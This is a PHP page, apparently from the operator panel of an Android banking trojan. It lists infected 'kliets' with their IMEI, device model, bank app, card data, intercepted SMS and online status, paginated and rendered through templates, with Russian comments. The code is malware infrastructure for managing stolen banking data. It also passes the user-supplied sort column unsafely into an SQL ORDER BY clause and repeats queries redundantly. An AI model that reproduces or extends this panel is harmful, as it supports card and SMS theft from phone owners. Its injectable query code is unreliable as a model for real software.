
<?php session_start();
include '../db.php';
include '../crypt.php';
include 'func.php';
if (!(isset($_SESSION['user_id']))){
    header("Location: ../index.php"); 
    return; 
}  
?>
<?php
if ($_GET['sort'] == ""){
    $sort = 'info2';
}else{
    $sort = $mysqli->real_escape_string($_GET['sort']);
}

$html = '';
$html_table = '';
$html_bottom_links = '';

$query = "SELECT * FROM `kliets` WHERE info != ''";    
$result = $mysqli->query($query);
$users_on_page="20";

$count = $result->num_rows;

// считаем страницы
$total = ceil($count / $users_on_page);

if(empty($_GET["p"])){$_GET["p"]="1";}
$p=$mysqli->real_escape_string($_GET["p"]);

$first = $p*$users_on_page-$users_on_page;
$query2 = "select * from `kliets` ORDER BY `{$sort}` DESC limit $first, $users_on_page ";
$result2 = $mysqli->query($query2);

$query = "SELECT * FROM `kliets` WHERE info != ''";    
$result = $mysqli->query($query);
$users_on_page="20";

$count = $result->num_rows;
$total = ceil($count / $users_on_page);

// страницы
if(empty($_GET["p"])){$_GET["p"]="1";}
$p=$mysqli->real_escape_string($_GET["p"]);

$mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);

//$first = $p*$users_on_page-$users_on_page;
$query3 = "SELECT * from `kliets` WHERE info != '' ";

if (isset($_SESSION['bank'])) {
    $conf = $_SESSION['bank'];
  } else {
    $conf = array("imei" => true,
      "android" => true,
      "country" => true,
      "seller" => true,
      "online" => true,
      "lastcon" => true,
      "bankapp" => true,
      "card" => true,
      "sms" => true,
      "firstcon" => false,
      "bank" => true,
      "comment" => true,
      "screen" => false,
      "number" => false,
      "model" => false);
  }

$sql = "SELECT * from `kliets` WHERE info != '' ";
$html_table = getBigTable('bank', $sql, $mysqli);

if ($_SESSION["wide-mode"] == "true"){
    $widemode = "checked";
} else {
    $widemode = "";
}

$html = file_get_contents("templates/banks.tpl");
$html = str_replace('%%PLACE_TOTAL_BANKS_HERE%%', $count, $html);
$html = str_replace('%%PLACE_TABLE_HERE%%', $html_table, $html);
$html = str_replace('%%PLACE_WIDEMODE_HERE%%', $widemode, $html);

//$html = str_replace('%%PLACE_FORM1_HERE%%', $html_form1, $html);
$html = str_replace('%%PLACE_BOTTOM_LINKS_HERE%%', pages_bottom("bank",$total,$p,$sort), $html);

# set chechboxes
foreach ($conf as $key => $value) {
    if ($value) {
        $check = "checked";
    } else {
        $check = "";
    }
    $placeholder = '%%PLACE_'.$key.'_CHECKBOX_HERE%%';
    $html = str_replace($placeholder, $check, $html);
}

echo $html;

?>
